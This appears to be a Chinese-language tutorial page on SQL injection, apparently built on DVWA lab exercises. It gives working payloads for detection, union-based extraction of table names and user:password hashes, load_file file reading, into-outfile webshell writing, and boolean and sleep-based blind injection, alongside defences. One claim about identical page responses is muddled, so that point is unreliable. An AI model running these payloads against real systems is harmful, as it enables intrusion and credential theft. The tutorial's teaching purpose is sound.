判断是否存在注入"></a>1.3 判断是否存在注入</h1><p>回显是指页面有数据 信息返回</p><p>id &#x3D;1 and 1&#x3D;1</p><p>id &#x3D; 1 and 1&#x3D;2</p><p>id &#x3D; 1 or 1&#x3D;1</p><p>id &#x3D; ‘1’ or ‘1’&#x3D;’1’</p><p>id&#x3D;” 1 “or “1”&#x3D;”1”</p><p>无回显是指 根据输入的语句 页面没有任何变化,或者没有数据库中的内容显示</p><p>到网页中</p><p>在 SQL 盲注（Blind SQL Injection）中，攻击者通过观察页面的响应差异来判断是否存在 SQL 注入漏洞。你提到的两个测试语句 <code>1&#39;and &#39;1&#39;=&#39;1</code> 和 <code>1&#39;and &#39;1&#39;=&#39;2</code> 是典型的用于判断盲注的测试语句。下面来详细解释为什么这两个语句的响应会不一样，以及如何通过它们判断是否存在 SQL 注入漏洞。</p><h3 id="1-SQL-注入的基本原理"><a href="#1-SQL-注入的基本原理" class="headerlink" title="1. SQL 注入的基本原理"></a>1. <strong>SQL 注入的基本原理</strong></h3><p>SQL 注入攻击是通过在用户输入中插入恶意的 SQL 代码，从而干扰数据库的正常查询逻辑。盲注是一种特殊的 SQL 注入攻击，攻击者无法直接看到错误信息或查询结果，只能通过页面的响应（如页面是否加载成功、加载时间等）来判断注入是否成功。</p><h3 id="2-测试语句的逻辑"><a href="#2-测试语句的逻辑" class="headerlink" title="2. 测试语句的逻辑"></a>2. <strong>测试语句的逻辑</strong></h3><h4 id="测试语句-1-1-and-1-1"><a href="#测试语句-1-1-and-1-1" class="headerlink" title="测试语句 1: 1&#39;and &#39;1&#39;=&#39;1"></a>测试语句 1: <code>1&#39;and &#39;1&#39;=&#39;1</code></h4><ul><li><p><strong>逻辑解释</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>这个语句的逻辑是：</p><ul><li><code>1&#39;</code>：闭合原始 SQL 语句中的单引号。</li><li><code>AND &#39;1&#39;=&#39;1</code>：这是一个恒真的条件，因为 <code>&#39;1&#39;=&#39;1</code> 永远成立。</li></ul><p>如果原始 SQL 语句是：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>注入后的语句变为：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>这个语句的逻辑没有改变，仍然会正常执行，页面应该会正常加载。</p></li></ul><h4 id="测试语句-2-1-and-1-2"><a href="#测试语句-2-1-and-1-2" class="headerlink" title="测试语句 2: 1&#39;and &#39;1&#39;=&#39;2"></a>测试语句 2: <code>1&#39;and &#39;1&#39;=&#39;2</code></h4><ul><li><p><strong>逻辑解释</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>这个语句的逻辑是：</p><ul><li><code>1&#39;</code>：闭合原始 SQL 语句中的单引号。</li><li><code>AND &#39;1&#39;=&#39;2</code>：这是一个恒假的条件，因为 <code>&#39;1&#39;=&#39;2</code> 永远不成立。</li></ul><p>如果原始 SQL 语句是：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>注入后的语句变为：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure><p>这个语句的逻辑被破坏，因为 <code>&#39;1&#39;=&#39;2</code> 永远不成立，所以整个查询不会返回任何结果，页面可能会显示错误或加载失败。</p></li></ul><h3 id="3-为什么页面响应不一样"><a href="#3-为什么页面响应不一样" class="headerlink" title="3. 为什么页面响应不一样"></a>3. <strong>为什么页面响应不一样</strong></h3><ul><li>**<code>1&#39;and &#39;1&#39;=&#39;1</code>**：<ul><li>页面正常加载，因为注入的条件是恒真的，不会影响原始查询的逻辑。</li></ul></li><li>**<code>1&#39;and &#39;1&#39;=&#39;2</code>**：<ul><li>页面加载失败或显示错误，因为注入的条件是恒假的，导致查询无法正常执行。</li></ul></li></ul><h3 id="4-如何判断-SQL-注入漏洞"><a href="#4-如何判断-SQL-注入漏洞" class="headerlink" title="4. 如何判断 SQL 注入漏洞"></a>4. <strong>如何判断 SQL 注入漏洞</strong></h3><p>通过观察页面的响应差异，可以判断是否存在 SQL 注入漏洞：</p><ul><li>如果 <code>1&#39;and &#39;1&#39;=&#39;1</code> 和 <code>1&#39;and &#39;1&#39;=&#39;2</code> 的页面响应一样（例如，都正常加载或都显示错误），那么可能存在 SQL 注入漏洞。</li><li>如果 <code>1&#39;and &#39;1&#39;=&#39;1</code> 和 <code>1&#39;and &#39;1&#39;=&#39;2</code> 的页面响应不一样（例如，一个正常加载，一个显示错误），那么几乎可以确定存在 SQL 注入漏洞。</li><li><h4 id="为什么通过页面响应差异来判断"><a href="#为什么通过页面响应差异来判断" class="headerlink" title="为什么通过页面响应差异来判断"></a><strong>为什么通过页面响应差异来判断</strong></h4></li></ul><h5 id="情况-1：页面响应一样"><a href="#情况-1：页面响应一样" class="headerlink" title="情况 1：页面响应一样"></a><strong>情况 1：页面响应一样</strong></h5><p>如果 <code>1&#39;and &#39;1&#39;=&#39;1</code> 和 <code>1&#39;and &#39;1&#39;=&#39;2</code> 的页面响应一样（例如，都正常加载或都显示错误），那么可能存在 SQL 注入漏洞。原因如下：</p><ul><li><p><strong>正常加载的情况</strong>：</p><ul><li>如果两个语句都正常加载，说明注入的 SQL 代码被正确解析，但没有改变查询的逻辑。这可能是因为应用程序对注入的代码进行了某种处理（例如，过滤或转义），但没有完全阻止注入。这种情况下，虽然注入没有直接导致页面异常，但仍然可能存在漏洞，需要进一步测试。</li></ul></li><li><p><strong>都显示错误的情况</strong>：</p><ul><li>如果两个语句都显示错误，说明注入的 SQL 代码被正确解析，但应用程序没有正确处理错误。这可能是因为应用程序没有对错误进行适当的隐藏或处理，导致注入的代码引发了错误。这种情况下，虽然页面显示错误，但仍然说明注入的代码被正确解析，可能存在漏洞。</li></ul></li></ul><h5 id="情况-2：页面响应不一样"><a href="#情况-2：页面响应不一样" class="headerlink" title="情况 2：页面响应不一样"></a><strong>情况 2：页面响应不一样</strong></h5><p>如果 <code>1&#39;and &#39;1&#39;=&#39;1</code> 和 <code>1&#39;and &#39;1&#39;=&#39;2</code> 的页面响应不一样（例如，一个正常加载，一个显示错误），那么几乎可以确定存在 SQL 注入漏洞。原因如下：</p><ul><li><p><strong>正常加载 vs. 显示错误</strong>：</p><ul><li>如果 <code>1&#39;and &#39;1&#39;=&#39;1</code> 正常加载，而 <code>1&#39;and &#39;1&#39;=&#39;2</code> 显示错误，说明注入的 SQL 代码被正确解析，并且改变了查询的逻辑。<code>&#39;1&#39;=&#39;1</code> 是恒真条件，不会影响查询结果；而 <code>&#39;1&#39;=&#39;2</code> 是恒假条件，导致查询失败。这种差异表明注入的代码被正确执行，且对查询结果产生了直接影响，因此可以确定存在 SQL 注入漏洞。</li></ul></li></ul><h3 id="5-示例"><a href="#5-示例" class="headerlink" title="5. 示例"></a>5. <strong>示例</strong></h3><p>假设有一个用户登录页面，用户输入的用户名和密码会被用于以下 SQL 查询：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure><p>如果攻击者输入：</p><ul><li>**<code>1&#39;and &#39;1&#39;=&#39;1</code>**：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>页面正常加载。</li><li>**<code>1&#39;and &#39;1&#39;=&#39;2</code>**：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>页面加载失败或显示错误。</li></ul><p>通过这种差异，攻击者可以判断出页面存在 SQL 注入漏洞。</p><h3 id="6-防范措施"><a href="#6-防范措施" class="headerlink" title="6. 防范措施"></a>6. <strong>防范措施</strong></h3><p>为了避免 SQL 注入漏洞，建议采取以下措施：</p><ul><li><strong>使用参数化查询</strong>：这是最有效的防御方法。通过参数化查询，可以确保用户输入不会被当作 SQL 代码执行。</li><li><strong>输入验证</strong>：对用户输入进行严格的验证，确保输入符合预期格式。</li><li><strong>最小权限原则</strong>：限制数据库用户的权限，只授予必要的权限，避免攻击者获取过多信息。</li><li><strong>启用 WAF（Web 应用防火墙）</strong>：WAF 可以检测和阻止常见的 SQL 注入攻击。</li></ul><h1 id="1-4-注入流程"><a href="#1-4-注入流程" class="headerlink" title="1.4 注入流程"></a>1.4 注入流程</h1><ul><li><p>是否存在注入并且判断注入类型</p></li><li><p>判断字段数   order by     group by</p></li><li><p>确定回显点  union select 1,2</p></li><li><p>查询数据库信息  @@version   @@datadir</p></li><li><p>查询用户名，数据库名  user()  database()</p></li><li><p>文件读取 union select 1,load_file(‘C:\wondows\win.ini’)#</p></li><li><p>写入 webshell    select..into   outfile…</p></li><li><p>补充一点，使用 sql 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编</p></li></ul><p>码绕过</p><h1 id="SQL-注入常规利用思路："><a href="#SQL-注入常规利用思路：" class="headerlink" title="SQL 注入常规利用思路："></a>SQL 注入常规利用思路：</h1><p>1、寻找注入点，可以通过 web 扫描工具实现</p><p>2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用</p><p>户权限、操作系统信息、数据库版本等相关信息。</p><p>3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字</p><p>段名等信息）</p><p>3.1 还可以获取数据库的 root 账号 密码—思路</p><p>4、可以通过获得的用户信息，寻找后台登录。</p><p>5、利用后台或了解的进一步信息</p><h1 id="手工注入常规思路："><a href="#手工注入常规思路：" class="headerlink" title="手工注入常规思路："></a>手工注入常规思路：</h1><p>1.判断是否存在注入，注入是字符型还是数字型</p><p>2.猜解 SQL 查询语句中的字段数 order by N</p><p>3.确定显示的字段顺序</p><p>4.获取当前数据库</p><p>5.获取数据库中的表</p><p>6.获取表中的字段名</p><p>7.查询到账户的数据</p><h1 id="SQL-详细注入过程"><a href="#SQL-详细注入过程" class="headerlink" title="SQL 详细注入过程"></a>SQL 详细注入过程</h1><p>猜数据库：</p><p>1’ union select 1,database()</p><p>payload 利用另一种方式：</p><p>1’ union select user(),database()</p><p>version()</p><p>得到数据库名：dvwa</p><p>PS：union 查询结合了两个 select 查询结果，根据上面的 order by 语句我们知道</p><p>查询包含两列，为了能够现实两列查询结果，我们需要用 union 查询结合我们构</p><p>造的另外一个 select.注意在使用 union 查询的时候需要和主查询的列数相同。</p><p>猜表名：</p><p>1’ union select 1,group_concat(table_name) from information_schema.tables where</p><p>table_schema &#x3D;database()</p><p>得到表名：guestbook,users</p><p>group_concat 分组</p><p>猜列名：</p><p>1’ union select 1,group_concat(column_name) from information_schema.columns</p><p>where table_name &#x3D;0x7573657273#</p><p>1’ union select 1,group_concat(column_name) from information_schema.columns</p><p>where table_name &#x3D;’users’#</p><p>(用编码就不用单引号，用单引号就不用编码)</p><p>得到列：</p><p>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,usernam</p><p>e,password猜用户数据：</p><p>列举出几种 payload:</p><p>1’ or 1&#x3D;1 union select</p><p>group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>1’ union select null,concat_ws(char(32,58,32),user,password) from users #</p><p>1’ union select null,group_concat(concat_ws(char(32,58,32),user,password)) from</p><p>users #</p><p>得到用户数据：</p><p>admin 5f4dcc3b5aa765d61d8327deb882cf99</p><p>猜 root 用户：#</p><p>1’ union select 1,group_concat(user,password) from mysql.user#</p><p>得到 root 用户信息：</p><p>root*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</p><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="SUBSTRING-函数"><a href="#SUBSTRING-函数" class="headerlink" title="SUBSTRING() 函数"></a><code>SUBSTRING()</code> 函数</h2><h3 id="在-SQL-注入中的应用"><a href="#在-SQL-注入中的应用" class="headerlink" title="在 SQL 注入中的应用"></a><strong>在 SQL 注入中的应用</strong></h3><p>在 SQL 注入攻击中，攻击者经常使用 <code>SUBSTRING()</code> 函数来逐字符提取数据库中的数据，尤其是在盲注场景中。盲注是指攻击者无法直接看到查询结果，只能通过页面的响应（如加载时间、错误信息等）来判断注入是否成功。</p><h4 id="提取数据库中的数据"><a href="#提取数据库中的数据" class="headerlink" title="提取数据库中的数据"></a><strong>提取数据库中的数据</strong></h4><p>假设攻击者想提取数据库中的用户名，可以使用 <code>SUBSTRING()</code> 函数逐字符提取。例如，假设 <code>users</code> 表中有 <code>username</code> 字段，攻击者可以构造如下注入语句：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = &#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure><ul><li><p>**<code>SUBSTRING(username, 1, 1)</code>**：提取 <code>username</code> 字段的第一个字符。</p></li><li><p>**<code>LIMIT 1</code>**：限制只提取第一个用户。</p></li><li><p>**<code>= &#39;a&#39;</code>**：判断提取的字符是否为 <code>&#39;a&#39;</code>。</p></li></ul><p>如果页面响应正常，说明第一个字符是 <code>&#39;a&#39;</code>；如果页面显示错误或加载失败，说明第一个字符不是 <code>&#39;a&#39;</code>。</p><p>攻击者可以通过逐字符尝试，逐步提取出完整的用户名。例如：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 2, 1) FROM users LIMIT 1) = &#x27;</span>l<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">3</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;i&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 4, 1) FROM users LIMIT 1) = &#x27;</span>c<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">5</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;e&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p>通过这种方式，攻击者可以逐字符提取出完整的用户名。</p><h3 id="3-示例"><a href="#3-示例" class="headerlink" title="3. 示例"></a>3. <strong>示例</strong></h3><p>假设有一个用户登录页面，用户输入的用户名和密码会被用于以下 SQL 查询：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure><p>攻击者可以构造如下注入语句：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = &#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure><p>注入后的查询：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">1</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><ul><li><p>如果页面正常加载，说明第一个字符是 <code>&#39;a&#39;</code>。</p></li><li><p>如果页面显示错误或加载失败，说明第一个字符不是 <code>&#39;a&#39;</code>。</p></li></ul><p>攻击者可以通过逐字符尝试，逐步提取出完整的用户名。</p><h3 id="4-防范措施"><a href="#4-防范措施" class="headerlink" title="4. 防范措施"></a>4. <strong>防范措施</strong></h3><p>为了避免 SQL 注入攻击，建议采取以下措施：</p><ul><li><p><strong>使用参数化查询</strong>：这是最有效的防御方法。通过参数化查询，可以确保用户输入不会被当作 SQL 代码执行。</p></li><li><p><strong>输入验证</strong>：对用户输入进行严格的验证，确保输入符合预期格式。</p></li><li><p><strong>最小权限原则</strong>：限制数据库用户的权限，只授予必要的权限，避免攻击者获取过多信息。</p></li><li><p><strong>启用 WAF（Web 应用防火墙）</strong>：WAF 可以检测和阻止常见的 SQL 注入攻击。</p></li></ul><h1 id="1-5-UNION联合注入"><a href="#1-5-UNION联合注入" class="headerlink" title="1.5 UNION联合注入"></a>1.5 UNION联合注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进</p><p>行联合查询。两个表的字段要数要相同，不然会出现报错。</p><p>guestbook 表有三个字段</p><p>users 有八个字段</p><hr><p>如果直接联合两个表 因为列数跟第一个表不一样 会导致出错整合的联合查询方法</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;1 union select 1,2,3 from users</p><p>guestbook 有个三个字段 users 也需要有三个与之匹配</p><p>这些数字可以替换成字段的名称或者函数。</p><p>替换成函数</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;1 union select</p><p>database(),user(),version() from users字段替换成字段</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;1 union select</p><p>user_id,user,password from users</p><hr><p>如果没有加上 limit 限定条数会把所有内容查询出来，所以都会加上 limit 1 限定</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;1 union select</p><p>user_id,user,password from users limit 1但是只会显示第一条，因为 SELECT * FROM guestbook WHERE comment_id&#x3D;1</p><p>这个语句是存在记录的 如果想要admin的内容可以把1换成其他不存在的记录，</p><p>因为默认负数就表示不存在的，所以可以在数字前加上-1 即可显示第二个表的内</p><p>容。</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;-1 union select</p><p>user_id,user,password from users limit 1</p><h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><h3 id="函数说明："><a href="#函数说明：" class="headerlink" title="函数说明："></a>函数说明：</h3><ul><li><code>GROUP_CONCAT(user,0x3a,password)</code> 是一个 SQL 函数的用法，通常出现在 SQL 查询中，尤其是在涉及联合查询（如 SQL 注入攻击）的场景中。下面来详细解释它的作用和用途。</li></ul><hr><h3 id="1-GROUP-CONCAT-函数"><a href="#1-GROUP-CONCAT-函数" class="headerlink" title="1. GROUP_CONCAT 函数"></a>1. <strong><code>GROUP_CONCAT</code> 函数</strong></h3><pre><code>`GROUP_CONCAT` 是 MySQL 中的一个聚合函数，用于将多行的某个字段值拼接成一个字符串。它的基本语法是： sql</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">GROUP_CONCAT([<span class="keyword">DISTINCT</span>] expr [,expr ...]</span><br><span class="line">             [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;unsigned_integer <span class="operator">|</span> col_name <span class="operator">|</span> expr&#125;</span><br><span class="line">               [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>] [,col_name ...]]</span><br><span class="line">             [SEPARATOR str_val])</span><br></pre></td></tr></table></figure><pre><code>- **`expr`**：要拼接的字段或表达式。- **`ORDER BY`**：可选，用于指定拼接时的排序规则。- **`SEPARATOR`**：可选，默认是逗号（`,`），用于指定拼接时的分隔符。例如：</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="keyword">user</span> SEPARATOR <span class="string">&#x27;,&#x27;</span>) <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure><pre><code>这条 SQL 会将 `users` 表中的所有 `user` 字段值拼接成一个以逗号分隔的字符串。</code></pre><hr><h4 id="2-0x3a-的含义"><a href="#2-0x3a-的含义" class="headerlink" title="2. 0x3a 的含义"></a>2. <strong><code>0x3a</code> 的含义</strong></h4><pre><code>在 SQL 中，`0x3a` 是十六进制表示的冒号（`:`）字符。在 ASCII 编码中，冒号的十六进制值是 `3A`。因此，`0x3a` 被解释为一个冒号（`:`）。</code></pre><hr><h4 id="3-GROUP-CONCAT-user-0x3a-password-的作用"><a href="#3-GROUP-CONCAT-user-0x3a-password-的作用" class="headerlink" title="3. GROUP_CONCAT(user,0x3a,password) 的作用"></a>3. <strong><code>GROUP_CONCAT(user,0x3a,password)</code> 的作用</strong></h4><pre><code>`GROUP_CONCAT(user,0x3a,password)` 的作用是将 `user` 和 `password` 字段的值拼接成一个字符串，中间用冒号（`:`）分隔。具体来说：- `user` 是第一个字段值。- `0x3a` 被解释为冒号（`:`）。- `password` 是第二个字段值。例如，如果 `users` 表中有以下数据：</code></pre><h6 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h6><table><thead><tr><th align="left">user</th><th align="left">password</th></tr></thead><tbody><tr><td align="left">alice</td><td align="left">pass123</td></tr><tr><td align="left">bob</td><td align="left">pass456</td></tr></tbody></table><pre><code>那么 `GROUP_CONCAT(user,0x3a,password)` 的结果将是：`alice:pass123,bob:pass456`</code></pre><hr><h4 id="4-在-SQL-注入中的用途"><a href="#4-在-SQL-注入中的用途" class="headerlink" title="4. 在 SQL 注入中的用途"></a>4. <strong>在 SQL 注入中的用途</strong></h4><pre><code>在 SQL 注入攻击中，攻击者可能会利用 `GROUP_CONCAT` 来获取多个字段的值，以便一次性提取更多有用信息。例如：</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="keyword">user</span>,<span class="number">0x3a</span>,password) <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure><pre><code>这条 SQL 会将所有用户的用户名和密码拼接成一个字符串，中间用冒号分隔，方便攻击者一次性获取所有用户信息。</code></pre><hr><h4 id="5-示例-1"><a href="#5-示例-1" class="headerlink" title="5. 示例"></a>5. <strong>示例</strong></h4><pre><code>假设攻击者通过 SQL 注入攻击，构造了如下恶意 SQL：</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; UNION SELECT GROUP_CONCAT(user,0x3a,password) FROM users--</span></span><br></pre></td></tr></table></figure><pre><code>这条 SQL 的作用是：1. **闭合原始 SQL 语句**：`-1&#39;` 用于闭合原始 SQL 语句中的单引号。2. **联合查询**：`UNION SELECT` 用于将注入的查询结果与原始查询结果合并。3. **提取用户信息**：`GROUP_CONCAT(user,0x3a,password)` 将 `users` 表中的用户名和密码拼接成一个字符串，方便攻击者获取。</code></pre><hr><h4 id="6-防范措施-1"><a href="#6-防范措施-1" class="headerlink" title="6. 防范措施"></a>6. <strong>防范措施</strong></h4><pre><code>为了避免 SQL 注入攻击，建议采取以下措施：- **使用参数化查询**：这是最有效的防御方法。通过参数化查询，可以确保用户输入不会被当作 SQL 代码执行。- **输入验证**：对用户输入进行严格的验证，确保输入符合预期格式。- **最小权限原则**：限制数据库用户的权限，只授予必要的权限，避免攻击者获取过多信息。- **启用 WAF（Web 应用防火墙）**：WAF 可以检测和阻止常见的 SQL 注入攻击。</code></pre><hr><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>在上面详细的介绍了原理，现在再来分析有 SQL 注入漏洞的代码，通过分析代</p><p>码，更深入地了解 SQL 注入漏洞。</p><p>使用$_REQUEST 直接接收 id 参数，且没有进行过滤，且可以接收 cookie get post</p><p>这些传递方法。当传入 1 的时，页面正常返回用户信息。如果传入 1’ 语法会出现语句 You have an error in your SQL syntax;这种英文是</p><p>mysql 语法错误提示。</p><p>根据代码分析’$id’是属于字符串类型 所以在进行 SQL 注入检测的时候要注意匹配字符串</p><h1 id="1-6布尔型盲注"><a href="#1-6布尔型盲注" class="headerlink" title="1.6布尔型盲注"></a>1.6布尔型盲注</h1><p>原理：</p><h2 id="重要思想："><a href="#重要思想：" class="headerlink" title="重要思想："></a>重要思想：</h2><pre><code>二分法；</code></pre><p>在页面中不会显示数据库信息，一般情况下只会显示对与错的内容。</p><p>代码分析 加深印象</p><p>接收 id 的值，直接带入查询，如果存在即返回 users is exists in the database</p><p>否则显示 users id is missing 像这种只有正确与错误页面。页面不会显示数据库里任何内容，如果存在</p><p>注入，成为盲注入。</p><p>盲注入的方式有两种：一种是布尔型盲注入，另外一种是延时注入。</p><h2 id="1-6-1-判断盲注入"><a href="#1-6-1-判断盲注入" class="headerlink" title="1.6.1. 判断盲注入"></a>1.6.1. 判断盲注入</h2><p>[[1.3 判断是否存在注入]]<br>    输入 SQL 注入检测语句 判断页面是否不一样，如果不一样大概会存在 SQL 注入漏洞 1’and ‘1’&#x3D;’1 一样</p><pre><code>and &#39;1&#39;=&#39;2 不一样，如果输入检测语句页面没有任何改变可以使用延时语句进行检测 1&#39;andsleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 sleep(10) 即延时 10 秒执行。通过这两个检测方法的判断，可以确定存在 SQL 注入漏洞。</code></pre><h2 id="1-6-2-boolean-布尔型注入攻击"><a href="#1-6-2-boolean-布尔型注入攻击" class="headerlink" title="1.6.2 boolean 布尔型注入攻击"></a>1.6.2 boolean 布尔型注入攻击</h2><pre><code>布尔型注入攻击，因为页面不会返回任何数据库内容，所以不能使用联合查询将敏感信息显示在页面，但是可以通过构造 SQL 语句，获取数据。布尔型盲注入用到得 SQL 语句 select if(1=1,1,0) if()函数在 mysql 是判断，第一个参数表达式，如果条件成立，会显示 1，否则显示 0。1=1 表达式可以换成构造的 SQL 攻击语句。1&#39; and if(1=1,1,0)--+ 页面返回正常，这个语句实际上是 1’and 1，真 and 真 结果为真，1 是存在记录的。所以返回正确页面。1&#39; and if(1=2,1,0)--+ 页面返回错误，这个语句就是 1’and 0 ，真 and 假 结果为假，整个 SQL ID 的也是 0 所以没有记录，返回错误页面。</code></pre><h2 id="1-6-3-布尔型盲注入获取数据库敏感信息"><a href="#1-6-3-布尔型盲注入获取数据库敏感信息" class="headerlink" title="1.6.3. 布尔型盲注入获取数据库敏感信息"></a>1.6.3. 布尔型盲注入获取数据库敏感信息</h2><p>在黑盒的环境下，通过构造 SQL 注入语句，根据页面的特征确定获取敏感信息。</p><p>布尔型盲注入用到的函数</p><p>SUBSTRING()字符串截取，第一个参数是字符串，第二个参数是开始截取 第三三个是截取的长度。</p><p>select database()查询当前库</p><p>通过 substring 截取截取长度</p><p>接着再用 if 函数进行构造 select if(SUBSTRING(database(),1,1)&#x3D;’d’,1,0) 判断数据库第一个字是不是</p><p>字符 d，如果是返回 1 否则返回 0 。</p><p>接着判断第二个字符。将 substring 第二个参数写成 2 因为要截取第二个字符</p><p>select if(SUBSTRING(database(),2,1)&#x3D;’v’,1,0) 第二个字符为 v。如此类推。再后拼接字符就是完整的</p><p>库名。</p><h2 id="注入攻击-1"><a href="#注入攻击-1" class="headerlink" title="注入攻击"></a>注入攻击</h2><h2 id="1-6-4-在黑盒模式下布尔型注入"><a href="#1-6-4-在黑盒模式下布尔型注入" class="headerlink" title="1.6.4 在黑盒模式下布尔型注入"></a>1.6.4 在黑盒模式下布尔型注入</h2><p>在上面详细了说了布尔型盲注入的原理，在黑盒的模式下进行测试。</p><p>首先判断注入，判断完注入就获取数据库的长度，得到长度再查询库名，通过库名再查询表，接着通过表</p><p>查询字段，最后查询某表指定的数据。</p><p>1.16.1. 